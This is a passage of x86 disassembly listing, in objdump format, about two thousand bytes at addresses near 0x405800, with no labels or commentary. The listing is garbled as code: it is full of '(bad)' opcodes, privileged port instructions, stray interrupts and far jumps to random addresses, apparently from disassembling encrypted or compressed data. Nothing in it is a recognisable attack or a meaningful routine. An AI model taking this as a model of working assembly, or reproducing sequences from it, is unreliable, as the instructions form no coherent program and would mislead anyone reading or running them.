  40576b:	sub    ecx,DWORD PTR [esi+0x4f77b28b]
  405771:	out    dx,al
  405772:	nop
  405773:	dec    ebp
  405774:	aad    0xbb
  405776:	inc    edx
  405777:	js     0x405731
  405779:	jbe    0x40577c
  40577b:	xchg   ebx,eax
  40577c:	retf   0xfee7
  40577f:	push   ebp
  405780:	(bad)  
  405781:	outs   dx,DWORD PTR ds:[esi]
  405782:	fwait
  405783:	cmp    al,0x2
  405785:	mov    ds:0x352a4900,eax
  40578a:	aaa    
  40578b:	retf   
  40578c:	mov    cl,0x40
  40578e:	lahf   
  40578f:	inc    ebp
  405790:	mov    cl,0xaa
  405792:	jmp    0x405726
  405794:	mov    ebx,DWORD PTR ds:0x1dfb16b7
  40579a:	in     eax,dx
  40579b:	shl    DWORD PTR ds:0xadd4f3d,cl
  4057a1:	sub    ebx,esi
  4057a3:	pop    ebp
  4057a4:	je     0x4057e4
  4057a6:	jecxz  0x405750
  4057a8:	jnp    0x4057a7
  4057aa:	add    dh,BYTE PTR [ebx]
  4057ac:	loop   0x4057ca
  4057ae:	jmp    0x64ae658e
  4057b3:	sar    eax,1
  4057b5:	lods   eax,DWORD PTR ds:[esi]
  4057b6:	jns    0x40574d
  4057b8:	or     dh,dl
  4057ba:	inc    edx
  4057bb:	jp     0x4057e3
  4057bd:	push   esi
  4057be:	popf   
  4057bf:	icebp  
  4057c0:	shl    BYTE PTR fs:[edi-0x24],0xc8
  4057c5:	sbb    BYTE PTR [ebp+0x6e7df51e],bh
  4057cb:	xor    eax,0x6f7febf7
  4057d0:	sub    cl,BYTE PTR [edi+ebp*1-0x4c]
  4057d4:	lahf   
  4057d5:	pusha  
  4057d6:	mov    fs,WORD PTR [eax]
  4057d8:	adc    al,0xed
  4057da:	sub    ch,BYTE PTR [ecx-0x72]
  4057dd:	ret    
  4057de:	xchg   DWORD PTR [eax],ecx
  4057e0:	in     eax,dx
  4057e1:	inc    ebp
  4057e2:	jb     0x40584b
  4057e4:	inc    edx
  4057e5:	sbb    BYTE PTR [edi+eiz*4],dl
  4057e8:	out    dx,eax
  4057e9:	inc    ebp
  4057ea:	cmp    al,BYTE PTR [ecx+0xd]
  4057ed:	pop    es
  4057ee:	cmp    dl,BYTE PTR [esi+0x38]
  4057f1:	inc    ebp
  4057f2:	xchg   ebx,eax
  4057f3:	inc    esi
  4057f4:	fs and DWORD PTR fs:[edx+ebx*1-0x61],esi
  4057fa:	mov    bh,0xff
  4057fc:	mov    esp,0x6187d655
  405801:	arpl   sp,di
  405803:	test   eax,0xa9c17f21
  405808:	xchg   ebp,eax
  405809:	jmp    0x405871
  40580b:	jne    0x40581a
  40580d:	mov    bl,0xde
  40580f:	popf   
  405810:	dec    ecx
  405811:	jns    0x4057f1
  405813:	imul   esp,DWORD PTR [eax],0xa5c58d72
  405819:	mov    dh,0x55
  40581b:	retf   
  40581c:	call   0x2bf3845
  405821:	stos   BYTE PTR es:[edi],al
  405822:	test   eax,0xf0fecc1
  405827:	xchg   edi,eax
  405828:	jb     0x4057f9
  40582a:	adc    ebx,DWORD PTR [edi-0x17]
  40582d:	adc    al,0x24
  40582f:	xor    cl,al
  405831:	mov    esp,cs
  405833:	adc    esp,DWORD PTR [edi+0xe26e163]
  405839:	fisttp DWORD PTR [ebp-0x46]
  40583c:	cdq    
  40583d:	sbb    DWORD PTR [esi+0x59650989],eax
  405843:	and    BYTE PTR [esi-0x5218449a],al
  405849:	out    dx,al
  40584a:	jo     0x40587d
  40584c:	pop    ebp
  40584d:	or     BYTE PTR [eax],al
  40584f:	and    DWORD PTR [ebx-0x21],eax
  405852:	leave  
  405853:	jecxz  0x405890
  405855:	fnstsw WORD PTR [edi]
  405857:	imul   al
  405859:	jns    0x4057fe
  40585b:	pop    ss
  40585c:	mov    eax,0x91015231
  405861:	pop    ds
  405862:	xchg   esp,eax
  405863:	inc    edx
  405864:	int3   
  405865:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405867:	retf   0x9f16
  40586a:	test   eax,0x88761b8d
  40586f:	enter  0x996a,0x42
  405873:	mov    dl,0xd7
  405875:	xchg   BYTE PTR [edi+eiz*8],dh
  405878:	jle    0x405856
  40587a:	inc    ebx
  40587b:	cmp    eax,0xb48802a3
  405880:	rcl    DWORD PTR [ebx],0x9b
  405883:	or     BYTE PTR [edi+0x3b],dl
  405886:	ja     0x4058ba
  405888:	scas   eax,DWORD PTR es:[edi]
  405889:	mov    bh,0x4c
  40588b:	xchg   DWORD PTR [eax],edi
  40588d:	mov    dh,0xc2
  40588f:	(bad)  
  405891:	gs int 0x48
  405894:	xchg   edi,eax
  405895:	add    esi,DWORD PTR [edi]
  405897:	les    ebx,FWORD PTR [edi+0x63d2f802]
  40589d:	inc    edi
  40589e:	test   eax,0x1115d4e0
  4058a3:	jbe    0x4058eb
  4058a5:	and    ah,dl
  4058a7:	cmp    BYTE PTR [ebp-0x4d60c481],cl
  4058ad:	in     eax,dx
  4058ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058af:	pop    esp
  4058b0:	icebp  
  4058b1:	das    
  4058b2:	in     eax,0x3
  4058b4:	inc    eax
  4058b5:	inc    ebp
  4058b6:	cli    
  4058b7:	cld    
  4058b8:	rol    BYTE PTR [ebx+0x46],0x3a
  4058bc:	mov    ch,0xd7
  4058be:	mov    ebp,0xe667106
  4058c3:	outs   dx,BYTE PTR ds:[esi]
  4058c4:	push   eax
  4058c5:	outs   dx,BYTE PTR ds:[esi]
  4058c6:	outs   dx,BYTE PTR ds:[esi]
  4058c7:	sbb    al,0xcd
  4058c9:	push   edi
  4058ca:	push   edi
  4058cb:	test   al,bh
  4058cd:	mov    esp,0xd53faaad
  4058d2:	out    dx,al
  4058d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058d4:	sbb    DWORD PTR [esp+eax*2+0x19],ecx
  4058d8:	pop    ebx
  4058d9:	sar    bl,cl
  4058db:	fisub  WORD PTR [edi-0x6fca712e]
  4058e1:	lahf   
  4058e2:	loopne 0x4058b3
  4058e4:	in     eax,dx
  4058e5:	clc    
  4058e6:	das    
  4058e7:	xlat   BYTE PTR ds:[ebx]
  4058e8:	les    esp,FWORD PTR [ecx-0x42]
  4058eb:	pop    es
  4058ec:	ja     0x4058d6
  4058ee:	mov    al,0x5a
  4058f0:	push   esp
  4058f1:	jns    0x40591a
  4058f3:	dec    BYTE PTR [ebx+0x16]
  4058f6:	jno    0x405914
  4058f8:	cmp    eax,0xf446d224
  4058fd:	add    BYTE PTR [eax],0xa4
  405900:	xor    ecx,0xffffffd2
  405903:	mov    bh,0x7e
  405905:	push   esp
  405906:	mov    esi,0x1573dcd5
  40590b:	adc    BYTE PTR [eax],cl
  40590d:	ror    BYTE PTR [eax-0x684ddeab],0x8b
  405914:	mov    edi,0xa816d291
  405919:	jae    0x405980
  40591b:	xchg   DWORD PTR [ebp+0x721a895c],edx
  405921:	jmp    0x405979
  405923:	retf   
  405924:	pop    ss
  405925:	ins    DWORD PTR es:[edi],dx
  405926:	scas   al,BYTE PTR es:[edi]
  405927:	stos   DWORD PTR es:[edi],eax
  405928:	xchg   ebx,eax
  405929:	pop    esi
  40592a:	sub    al,BYTE PTR [edx+eiz*8-0x18]
  40592e:	mov    BYTE PTR [edi],al
  405930:	jo     0x40592a
  405932:	in     eax,0xb4
  405934:	retf   0xc08d
  405937:	push   ds
  405938:	add    edi,0x72
  40593b:	rol    BYTE PTR [esi+0x312952cb],0x53
  405942:	hlt    
  405943:	out    0xe4,al
  405945:	adc    dh,dl
  405947:	cwde   
  405948:	int    0x13
  40594a:	lahf   
  40594b:	test   eax,0xa4a036b5
  405950:	mov    edx,0x5a302b86
  405955:	add    esi,esi
  405957:	popa   
  405958:	jno    0x40595d
  40595a:	jnp    0x405975
  40595c:	xchg   ebx,eax
  40595d:	lahf   
  40595e:	xor    DWORD PTR [ecx-0x43],edi
  405961:	rcl    BYTE PTR [edi-0x1b5f8af9],1
  405967:	fiadd  WORD PTR [esi]
  405969:	test   BYTE PTR [eax+eiz*2+0x875bb8c],0x2b
  405971:	out    0xec,al
  405973:	jg     0x405939
  405975:	mov    esp,0xf33105dc
  40597a:	fst    DWORD PTR [edx+0x54]
  40597d:	inc    eax
  40597e:	dec    eax
  40597f:	dec    esi
  405980:	xchg   DWORD PTR [ebx+ebx*4+0x66],edx
  405984:	cmp    eax,0xbdb11b31
  405989:	jl     0x4059a0
  40598b:	ins    BYTE PTR es:[edi],dx
  40598c:	mov    dl,BYTE PTR [ebx+0x21be88e9]
  405992:	sub    DWORD PTR cs:0x93b1fc14,esi
  405999:	jne    0x405944
  40599b:	das    
  40599c:	in     al,dx
  40599d:	bound  esp,QWORD PTR [esp+ebx*8-0x48]
  4059a1:	nop
  4059a2:	push   esi
  4059a3:	(bad)  
  4059a4:	into   
  4059a5:	push   eax
  4059a6:	push   es
  4059a7:	scas   eax,DWORD PTR es:[edi]
  4059a8:	jo     0x40598d
  4059aa:	jmp    0xdf89:0x9b4581e0
  4059b1:	adc    dh,cl
  4059b3:	and    edi,DWORD PTR [ecx+eiz*4-0x2]
  4059b7:	or     eax,0x8faa2e4b
  4059bc:	xchg   edi,eax
  4059bd:	dec    esp
  4059be:	push   eax
  4059bf:	loop   0x4059ae
  4059c1:	call   0xf133:0xf1e5030
  4059c8:	sbb    al,0xc
  4059ca:	push   esi
  4059cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059cc:	repz sub eax,0x29ee0108
  4059d2:	fsub   st(0),st
  4059d4:	sar    cl,cl
  4059d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059d7:	lahf   
  4059d8:	push   ss
  4059d9:	mov    ebp,0x327aa10
  4059de:	or     dl,BYTE PTR [ebp+0x3]
  4059e1:	sahf   
  4059e2:	pop    ebx
  4059e3:	xchg   DWORD PTR [ebx+eiz*8],ecx
  4059e6:	inc    eax
  4059e7:	sbb    edx,DWORD PTR ds:0x7311b7b
  4059ed:	stc    
  4059ee:	leave  
  4059ef:	test   al,0x19
  4059f1:	aaa    
  4059f2:	push   edx
  4059f3:	pop    edi
  4059f4:	fcmovne st,st(6)
  4059f6:	jmp    0x4059e7
  4059f8:	(bad)  
  4059f9:	popf   
  4059fa:	dec    ebp
  4059fb:	inc    esi
  4059fc:	std    
  4059fd:	imul   ebp,ebx,0xa01e5115
  405a03:	leave  
  405a04:	outs   dx,DWORD PTR ds:[esi]
  405a05:	outs   dx,DWORD PTR ds:[esi]
  405a06:	add    al,0x5e
  405a08:	sbb    BYTE PTR [ebx+0x6d2a52fb],al
  405a0e:	neg    DWORD PTR [esi]
  405a10:	mov    ds:0xf6e88d2b,al
  405a15:	imul   esp,DWORD PTR [edx],0x1f18c577
  405a1b:	mov    ecx,0x5e42b86
  405a20:	js     0x405a9e
  405a22:	ror    BYTE PTR [edx+0x56],cl
  405a25:	(bad)  
  405a26:	test   esp,0xab7c552
  405a2c:	pop    edx
  405a2d:	xor    al,0x24
  405a2f:	mov    edi,0x70c600f3
  405a34:	mov    ds:0x8f03291,eax
  405a39:	arpl   sp,dx
  405a3b:	(bad)  
  405a3c:	mov    esp,0x9a2cb159
  405a41:	retf   
  405a42:	in     eax,0xb1
  405a44:	sbb    ecx,DWORD PTR [edi]
  405a46:	add    esp,DWORD PTR [edx+edi*1-0x3f43b8da]
  405a4d:	cdq    
  405a4e:	int3   
  405a4f:	pusha  
  405a50:	dec    esp
  405a51:	xchg   esp,eax
  405a52:	dec    ebp
  405a53:	adc    eax,0xef50dc4d
  405a58:	(bad)  [esi]
  405a5a:	mov    ch,0x4e
  405a5c:	aas    
  405a5d:	cdq    
  405a5e:	lahf   
  405a5f:	mov    ds:0xe93276bd,eax
  405a64:	daa    
  405a65:	fild   QWORD PTR [ebx+esi*4]
  405a68:	push   ebx
  405a69:	inc    esp
  405a6a:	mov    edi,0xe2fa5e2f
  405a6f:	and    DWORD PTR [esi-0x1c],esi
  405a72:	inc    ecx
  405a73:	ds jle 0x405a53
  405a76:	push   edi
  405a77:	test   al,0x24
  405a79:	xchg   DWORD PTR [edi+edx*8-0xe],eax
  405a7d:	arpl   WORD PTR [edi-0x2df9be24],si
  405a83:	cmp    eax,0x7f251176
  405a88:	pop    edi
  405a89:	mov    ds:0xc1f57622,al
  405a8e:	sub    BYTE PTR es:[edi+esi*2],ah
  405a92:	pusha  
  405a93:	mov    ecx,0x6503f837
  405a98:	nop
  405a99:	mov    ecx,0x3fd0ce2a
  405a9e:	std    
  405a9f:	(bad)  
  405aa0:	jp     0x405a7e
  405aa2:	cmp    ebx,eax
  405aa4:	jb     0x405a43
  405aa6:	outs   dx,DWORD PTR ds:[esi]
  405aa7:	or     al,0xbf
  405aa9:	sub    eax,0xcb00ff80
  405aae:	test   eax,0x288a0157
  405ab3:	fisub  WORD PTR [ecx]
  405ab5:	jae    0x405a39
  405ab7:	call   0x8e21844d
  405abc:	sub    dl,dl
  405abe:	adc    ah,BYTE PTR [ecx+ebx*8-0x7952b85c]
  405ac5:	inc    eax
  405ac6:	add    al,0xc5
  405ac8:	adc    dh,BYTE PTR [ebp+0x20d0e70b]
  405ace:	ja     0x405aae
  405ad0:	idiv   BYTE PTR [ebp+0x1d41af91]
  405ad6:	js     0x405ada
  405ad8:	sahf   
  405ad9:	dec    ecx
  405ada:	daa    
  405adb:	test   esi,ebx
  405add:	jmp    FWORD PTR [esi+0x7a]
  405ae0:	sub    DWORD PTR [esi],edx
  405ae2:	push   cs
  405ae3:	stos   BYTE PTR es:[edi],al
  405ae4:	and    edi,DWORD PTR ds:0xb230b865
  405aea:	cmp    BYTE PTR [edi+edi*8+0x73],0x6
  405aef:	mov    ebx,0xa32a550c
  405af4:	(bad)  
  405af5:	les    ebp,FWORD PTR [eax+0x341520]
  405afb:	pushf  
  405afc:	sub    BYTE PTR [esi],ah
  405afe:	ins    DWORD PTR es:[edi],dx
  405aff:	cmp    BYTE PTR [edx-0x34c862bb],0xfc
  405b06:	imul   esp,DWORD PTR [ecx-0xb],0xfffffffa
  405b0a:	ret    0x84ea
  405b0d:	cwde   
  405b0e:	push   ds
  405b0f:	adc    DWORD PTR [esi],0x82703656
  405b15:	mov    gs,ecx
  405b17:	dec    esp
  405b18:	aas    
  405b19:	xchg   esi,eax
  405b1a:	in     eax,dx
  405b1b:	sub    al,0x70
  405b1d:	sbb    eax,0x30c3b01f
  405b22:	div    BYTE PTR [eax]
  405b24:	mov    ah,BYTE PTR [ebp+0x29e271bb]
  405b2a:	jmp    0xca90:0xa242d225
  405b31:	or     eax,DWORD PTR [ebx-0x4e]
  405b34:	add    eax,0x66968f92
  405b39:	inc    ebx
  405b3a:	adc    BYTE PTR [edx+0x30e60b16],dl
  405b40:	sbb    ah,al
  405b42:	dec    esp
  405b43:	sub    BYTE PTR [ebx+0x42],0xf9
  405b47:	sti    
  405b48:	pop    eax
  405b49:	stos   BYTE PTR es:[edi],al
  405b4a:	test   al,0x5
  405b4c:	inc    ebp
  405b4d:	dec    ebp
  405b4e:	hlt    
  405b4f:	sbb    bl,BYTE PTR [ebp-0xd039860]
  405b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b56:	xor    eax,0x45cb2984
  405b5b:	xor    eax,0x6e5b90f3
  405b60:	in     eax,dx
  405b61:	ins    DWORD PTR es:[edi],dx
  405b62:	xchg   esp,eax
  405b63:	sbb    BYTE PTR [ebp-0x27d46f78],bh
  405b69:	xchg   esi,eax
  405b6a:	or     eax,0x51e63ed6
  405b6f:	jge    0x405b04
  405b71:	mov    bh,0x70
  405b73:	mov    BYTE PTR [ecx-0xb829d2f],0xec
  405b7a:	mov    al,ds:0x1bd24a42
  405b7f:	push   0xffffff97
  405b81:	iret   
  405b82:	rdpmc  
  405b84:	sti    
  405b85:	fisttp WORD PTR [esi]
  405b87:	not    DWORD PTR [esi+edi*2]
  405b8a:	push   ebx
  405b8b:	jo     0x405bb0
  405b8d:	mov    al,0xf1
  405b8f:	lods   al,BYTE PTR ds:[esi]
  405b90:	das    
  405b91:	popf   
  405b92:	out    0x55,eax
  405b94:	scas   eax,DWORD PTR es:[edi]
  405b95:	xchg   esp,eax
  405b96:	pushf  
  405b97:	xchg   esp,eax
  405b98:	xor    al,0x1b
  405b9a:	mov    ah,0x12
  405b9c:	jg     0x405bb8
  405b9e:	pop    ebp
  405b9f:	out    0x81,eax
  405ba1:	icebp  
  405ba2:	test   al,0x23
  405ba4:	dec    ecx
  405ba5:	add    eax,0x677c8819
  405baa:	loop   0x405c1d
  405bac:	add    BYTE PTR [esi-0x1a47cf06],ch
  405bb2:	jnp    0x405c0f
  405bb4:	add    al,0x64
  405bb6:	or     DWORD PTR [ebp-0x188d220c],0x31189201
  405bc0:	push   edx
  405bc1:	pushf  
  405bc2:	mov    bh,0x3f
  405bc4:	and    al,0x15
  405bc6:	int    0x80
  405bc8:	or     eax,0x1b648a48
  405bcd:	add    BYTE PTR [ebx],ch
  405bcf:	xor    eax,0x7656e3f2
  405bd4:	mov    DWORD PTR [esi+0x633ca32b],0xd80e0357
  405bde:	sti    
  405bdf:	mov    esp,0xe9db349e
  405be4:	mov    edx,0x862c7ad0
  405be9:	sbb    al,0xc8
  405beb:	adc    bl,bl
  405bed:	imul   cl
  405bef:	mov    ch,0xfd
  405bf1:	stos   BYTE PTR es:[edi],al
  405bf2:	mov    eax,0xde95874
  405bf7:	scas   eax,DWORD PTR es:[edi]
  405bf8:	xor    DWORD PTR [esi+0x65b0c4ef],0xffffffb0
  405bff:	cmp    dh,BYTE PTR [eax+0x277471c6]
  405c05:	outs   dx,DWORD PTR ds:[esi]
  405c06:	and    DWORD PTR [esi-0x16971440],0x9a9c43c3
  405c10:	cmp    BYTE PTR [ecx-0xe47a367],al
  405c16:	ds xor ecx,ecx
  405c19:	mov    esp,DWORD PTR [ecx-0x71b00747]
  405c1f:	pop    ebx
  405c20:	test   al,0x25
  405c22:	lahf   
  405c23:	lods   al,BYTE PTR ds:[esi]
  405c24:	cs sbb eax,0x3d24cb2b
  405c2a:	push   0x11
  405c2c:	pop    ss
  405c2d:	xchg   BYTE PTR [ebp+0x21],ah
  405c30:	mov    al,ds:0xb521fcde
  405c35:	cmc    
  405c36:	stos   DWORD PTR es:[edi],eax
  405c37:	in     al,dx
  405c38:	push   ebp
  405c39:	unpcklps xmm4,XMMWORD PTR [edi+0x38d16a9e]
  405c40:	stos   BYTE PTR es:[edi],al
  405c41:	inc    ebx
  405c42:	ins    BYTE PTR es:[edi],dx
  405c43:	jnp    0x405bd9
  405c45:	cdq    
  405c46:	ret    
  405c47:	call   0x37185148
  405c4c:	mov    eax,ds:0x3412ac9c
  405c51:	mov    dh,BYTE PTR [ecx+0x56]
  405c54:	or     eax,0x977d2f47
  405c59:	inc    esp
  405c5a:	addr16 clc 
  405c5c:	lds    edi,FWORD PTR [eax-0x6476f9b3]
  405c62:	enter  0xbc96,0x60
  405c66:	mov    dh,0xe5
  405c68:	in     al,0x21
  405c6a:	add    ch,0xe6
  405c6d:	mov    eax,ds:0x9eb18fa8
  405c72:	xor    edx,DWORD PTR [edi+0x68]
  405c75:	pop    ecx
  405c76:	or     ah,BYTE PTR [edi]
  405c78:	(bad)  
  405c79:	xchg   edx,eax
  405c7a:	dec    eax
  405c7b:	or     BYTE PTR [ecx],0x7a
  405c7e:	es fwait
  405c80:	mov    ch,0x49
  405c82:	push   ecx
  405c83:	add    BYTE PTR [ebp+0x6aa33822],bh
  405c89:	sub    BYTE PTR [edi+ebp*1+0x79f8762e],0x36
  405c91:	out    dx,eax
  405c92:	xor    BYTE PTR [ecx+0x33ab6d14],bl
  405c98:	prefetch (bad)
  405c99:	or     eax,0x39b3c5fe
  405c9e:	mul    dl
  405ca0:	cdq    
  405ca1:	push   edi
  405ca2:	repz inc esi
  405ca4:	xor    BYTE PTR [ecx-0x1957635d],bh
  405caa:	fwait
  405cab:	or     eax,0x43265373
  405cb0:	(bad)  
  405cb1:	jg     0x405ccc
  405cb3:	xlat   BYTE PTR ds:[ebx]
  405cb5:	or     dl,bh
  405cb7:	jecxz  0x405ceb
  405cb9:	cmp    al,0x93
  405cbb:	and    al,0xb1
  405cbd:	shl    BYTE PTR [ecx-0x5b15df11],1
  405cc3:	fcom   st(5)
  405cc5:	mul    DWORD PTR [esp+edi*2]
  405cc8:	out    dx,eax
  405cc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cca:	ja     0x405cc8
  405ccc:	(bad)  
  405ccd:	sub    al,0x8d
  405ccf:	gs cs (bad) 
  405cd3:	(bad)  
  405cd4:	loopne 0x405d1f
  405cd6:	adc    al,0x76
  405cd8:	jb     0x405ce0
  405cda:	xchg   ebp,eax
  405cdb:	dec    edi
  405cdc:	je     0x405cfa
  405cde:	mov    DWORD PTR [edx],edi
  405ce0:	dec    ebx
  405ce1:	adc    eax,0x15e1b2ad
  405ce6:	adc    al,0x6e
  405ce8:	(bad)  
  405ce9:	pop    ds
  405cea:	fwait
  405ceb:	into   
  405cec:	mov    ds:0x252773f1,eax
  405cf1:	sbb    eax,0x9f3038ad
  405cf6:	(bad)  
  405cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cf8:	es imul ebp
  405cfb:	neg    edx
  405cfd:	mov    bh,0xb2
  405cff:	mov    ebx,0x8ee7dee0
  405d04:	in     al,0x26
  405d06:	js     0x405d74
  405d08:	sbb    edx,edx
  405d0a:	pop    ds
  405d0b:	inc    eax
  405d0c:	dec    ebx
  405d0d:	cmp    al,0x48
  405d0f:	mov    al,0xc2
  405d11:	mov    cl,0xb9
  405d13:	das    
  405d14:	mov    ah,0x62
  405d16:	pop    edx
  405d17:	lods   eax,DWORD PTR ds:[esi]
  405d18:	add    DWORD PTR [edi+0x327b921f],esp
  405d1e:	(bad)  
  405d1f:	jmp    0xc6cf:0xa53d1970
  405d26:	sub    BYTE PTR [ecx-0x65776619],0x6d
  405d2d:	jbe    0x405da4
  405d2f:	adc    DWORD PTR ds:0x22c76719,ebx
  405d35:	fwait
  405d36:	and    DWORD PTR [edi],ebx
  405d38:	push   0x155c919a
  405d3d:	sub    dh,BYTE PTR [eax+0x3c]
  405d40:	int3   
  405d41:	cmp    ah,BYTE PTR [esi]
  405d43:	(bad)  
  405d44:	popa   
  405d45:	shr    DWORD PTR [edi+edi*1+0x3ec5434e],1
  405d4c:	inc    ebp
  405d4d:	inc    ebx
  405d4e:	sub    DWORD PTR [eax+0x7c],edx
  405d51:	xchg   ebp,eax
  405d52:	push   es
  405d53:	adc    al,0x81
  405d55:	sub    eax,0xec89e8c6
  405d5a:	cmc    
  405d5b:	pop    eax
  405d5c:	aam    0xd2
  405d5e:	dec    ecx
  405d5f:	mov    al,ds:0x98bd0af3
  405d64:	xchg   DWORD PTR [eax+0x60],esp
  405d67:	add    BYTE PTR [ecx],dl
  405d69:	jnp    0x405d09
  405d6b:	push   ebx
  405d6c:	xchg   BYTE PTR [esi],ch
  405d6e:	dec    ecx
  405d6f:	ror    BYTE PTR [edi+0x62],1
  405d72:	push   0xfffffff6
  405d74:	add    cl,cl
  405d76:	(bad)  
  405d77:	mov    ss,WORD PTR [edi]
  405d79:	imul   esi,esi,0xc6dafe6a
  405d7f:	mov    dh,0xed
  405d81:	mov    bp,0x6ff5
  405d85:	mov    ds:0xf776cb00,eax
  405d8a:	jge    0x405d87
  405d8c:	jne    0x405d8b
  405d8e:	ret    
  405d8f:	es and al,0x72
  405d92:	fucomp st(3)
  405d94:	into   
  405d95:	cwde   
  405d96:	rcr    BYTE PTR [edi+0x1],1
  405d99:	sub    DWORD PTR [edi],esi
  405d9b:	aam    0xcc
  405d9d:	xor    BYTE PTR [ecx-0x37f22ba6],bh
  405da3:	push   ebp
  405da4:	fwait
  405da5:	loopne 0x405df7
  405da7:	inc    ebx
  405da8:	or     eax,0x77f71c97
  405dad:	mov    al,ds:0xe57a8ccb
  405db2:	pushf  
  405db3:	mov    bl,0x4f
  405db5:	les    edx,FWORD PTR [ebx-0x68f096c4]
  405dbb:	cmp    edi,ebp
  405dbd:	adc    al,0xe
  405dbf:	mov    esp,0xf75a2a7a
  405dc4:	in     al,0xde
  405dc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dc7:	jecxz  0x405df7
  405dc9:	fwait
  405dca:	pop    ecx
  405dcb:	test   al,0xa0
  405dcd:	test   DWORD PTR ds:0x739685fe,ebp
  405dd3:	dec    eax
  405dd4:	cmp    al,al
  405dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dd7:	sbb    BYTE PTR [eax+eiz*8],bl
  405dda:	add    al,0x9d
  405ddc:	imul   esi,DWORD PTR [ebp-0x60696834],0x20fd7e2
  405de6:	push   0x68
  405de8:	outs   dx,DWORD PTR ds:[esi]
  405de9:	retf   
  405dea:	(bad)  
  405deb:	jns    0x405e48
  405ded:	fwait
  405dee:	cwde   
  405def:	fnstsw WORD PTR [edx+0x3d]
  405df2:	pusha  
  405df3:	(bad)
  405df6:	shl    DWORD PTR [ebp+0x5c],0x4e
  405dfa:	add    ch,BYTE PTR [ecx+0x7909e88a]
  405e00:	mov    ah,0x8c
  405e02:	sbb    eax,0x4f646ee9
  405e07:	rcl    DWORD PTR [ebp+edi*1-0x4e],1
  405e0b:	xchg   esp,eax
  405e0c:	jge    0x405e3c
  405e0e:	cmc    
  405e0f:	pop    ecx
  405e10:	test   BYTE PTR [esi+0x6],bh
  405e13:	xor    DWORD PTR [esi-0x7f],0x8fc4c6ea
  405e1a:	mov    eax,0xb3d39108
  405e1f:	jmp    0x405e82
  405e21:	mov    DWORD PTR [eax-0x55],edi
  405e24:	mov    bl,bl
  405e26:	lahf   
  405e27:	imul   edx,DWORD PTR [eax*8+0x48156016],0x49
  405e2f:	jl     0x405e2c
  405e31:	adc    dh,BYTE PTR [edx+0x27]
  405e34:	pop    ecx
  405e35:	das    
  405e36:	mov    ds:0x9d470b9c,eax
  405e3b:	jmp    0xe3526b21
  405e40:	nop
  405e41:	lods   al,BYTE PTR ds:[esi]
  405e42:	js     0x405e3b
  405e44:	lea    esp,[ebx+0x5e]
  405e47:	inc    ebx
  405e48:	mov    ebp,0x1c732606
  405e4d:	add    esp,esi
  405e4f:	aad    0xfd
  405e51:	mov    ebx,0x60daf0f9
  405e56:	sbb    edx,0x5288290
  405e5c:	jne    0x405e1f
  405e5e:	jae    0x405de0
  405e60:	jnp    0x8133d1ec
  405e66:	push   eax
  405e67:	pop    es
  405e68:	cwde   
  405e69:	out    0x80,eax
  405e6b:	ss mov bl,0x4c
  405e6e:	inc    BYTE PTR [edx+0x20140ce2]
  405e74:	jae    0x405e6e
  405e76:	inc    ecx
  405e77:	pop    ss
  405e78:	and    bh,BYTE PTR [ebx]
  405e7a:	(bad)  
  405e7b:	into   
  405e7c:	xchg   edx,eax
  405e7d:	fisubr DWORD PTR [edi]
  405e7f:	fiadd  WORD PTR [ecx]
  405e81:	(bad)  
  405e82:	push   cs
  405e83:	mov    dh,0x9d
  405e85:	mov    ecx,0xc1b91b0d
  405e8a:	xor    DWORD PTR [ebx],esi
  405e8c:	int3   
  405e8d:	leave  
  405e8e:	mov    esi,0xb565e923
  405e93:	test   DWORD PTR ds:0xa4e8127e,eax
  405e99:	icebp  
  405e9a:	punpcklbw mm7,DWORD PTR [eax+eiz*4-0x4f]
  405e9f:	mov    al,ah
  405ea1:	dec    esi
  405ea2:	dec    eax
  405ea3:	es cmc 
  405ea5:	fptan  
  405ea7:	jmp    0xbcaaf9e5
  405eac:	mov    ebx,0xffc47b28
  405eb1:	stos   BYTE PTR es:[edi],al
  405eb2:	push   esp
  405eb3:	pop    ss
  405eb4:	mov    ebx,0x3ff0c2a0
  405eb9:	jl     0x405ed1
  405ebb:	xor    esi,0x49
  405ebe:	popf   
  405ebf:	xchg   esi,eax
  405ec0:	stos   DWORD PTR es:[edi],eax
  405ec1:	hlt    
  405ec2:	mov    dh,0x25
  405ec4:	out    0xd6,al
  405ec6:	xor    edi,DWORD PTR [eax-0x12]
  405ec9:	pusha  
  405eca:	(bad)  
  405ecb:	mov    ch,0xa2
  405ecd:	lock hlt 
  405ecf:	in     eax,dx
  405ed0:	ret    0xb00c
  405ed3:	in     eax,0xff
  405ed5:	dec    eax
  405ed6:	rcl    eax,0x82
  405ed9:	aam    0xe4
  405edb:	mov    dl,0xde
  405edd:	mov    gs,WORD PTR [edi]
  405edf:	xlat   BYTE PTR ds:[ebx]
  405ee0:	lahf   
  405ee1:	aas    
  405ee2:	xlat   BYTE PTR ds:[ebx]
  405ee3:	es (bad) 
  405ee5:	int3   
  405ee6:	mov    dl,0x39
  405ee8:	dec    ebp
  405ee9:	ret    
  405eea:	inc    esp
  405eeb:	xor    al,0x47
  405eed:	stc    
  405eee:	xchg   esp,eax
  405eef:	icebp  
  405ef0:	scas   eax,DWORD PTR es:[edi]
  405ef1:	push   ebp
  405ef2:	inc    ebp
  405ef3:	cwde   
  405ef4:	dec    eax
  405ef5:	pop    ecx
  405ef6:	sub    bl,BYTE PTR [edx-0x32]
  405ef9:	std    
  405efa:	hlt    
  405efb:	lahf   
  405efc:	push   es
  405efd:	repnz mov ds:0xf1bbad78,eax
  405f03:	cmp    esi,DWORD PTR [esi+0x6042670]
  405f09:	bound  eax,QWORD PTR [edi+0x46]
  405f0c:	mov    esi,0xc9d31810
  405f11:	call   0x3fce8d5b
  405f16:	ss out dx,eax
  405f18:	dec    ebp
  405f19:	cs xor al,0x19
  405f1c:	cwde   
  405f1d:	mov    eax,ds:0xb2d286b5
  405f22:	js     0x405f3e
  405f24:	aam    0x61
  405f26:	ins    DWORD PTR es:[edi],dx
  405f27:	jp     0x405f78
